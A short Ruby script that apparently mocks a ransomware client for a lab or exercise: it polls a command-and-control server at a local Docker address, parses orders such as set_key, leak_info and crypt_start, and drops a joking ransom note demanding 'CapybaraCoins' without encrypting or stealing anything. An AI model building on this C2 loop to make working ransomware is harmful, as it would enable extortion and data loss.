#!/usr/bin/ruby
#Libraries
require 'net/http'
require 'uri'

#C2 Connection String
$c2_server = "172.17.0.1:4567"

#Attack Routine
command_identifiers = ["SEQ_START", "set_key", "leak_info", "crypt_start", "SEQ_END", "new_server", "new_key"]
puts "Getting SEQ..."
uri = URI.parse("http://#{$c2_server}/")
response = Net::HTTP.get_response(uri)
res = response.body
res.split(",").each do |line|
    if line.split(": ")[1].match?(Regexp.union(command_identifiers))
        order =  line.split(": ")[1]
        case order
        when /SEQ_START/
            puts "Received SEQ_START"
        when /set_key/
            puts "Received Key: #{(order.split("set_key ")[1])[0...-3]}"
        when /leak_info/
            puts "No information to leak. Host will not be enrolled."
        when /crypt_start/
            puts "Starting encryption cycle..."
            begin
                desktop = ""
                if Dir.exist?(File.expand_path('~') + "/Desktop")
                    desktop = "#{File.expand_path('~')}/Desktop"
                elsif Dir.exist?(File.expand_path('~') + "/Escritorio")
                    desktop = "#{File.expand_path('~')}/Escritorio"
                else
                    desktop = "/tmp"
                end
                File.open("#{desktop}/your_files_are_encrypted.txt", "w+") { |file| file.write("Your files are encrypted. Send us 2 CapybaraCoins to decrypt. Capybaracoins are the official uruguayan currency. $2 coins feature a nice and friendly capybara, AND WE WANT ALL OF THEM. NOW.") }
                ""
            rescue => e
                puts "Exception: #{e}"
                "Error: Failed to run supplied command."
            end
        when /SEQ_END/
            puts "Received SEQ_END"
        else
            "Bad Response"
        end
    end
end
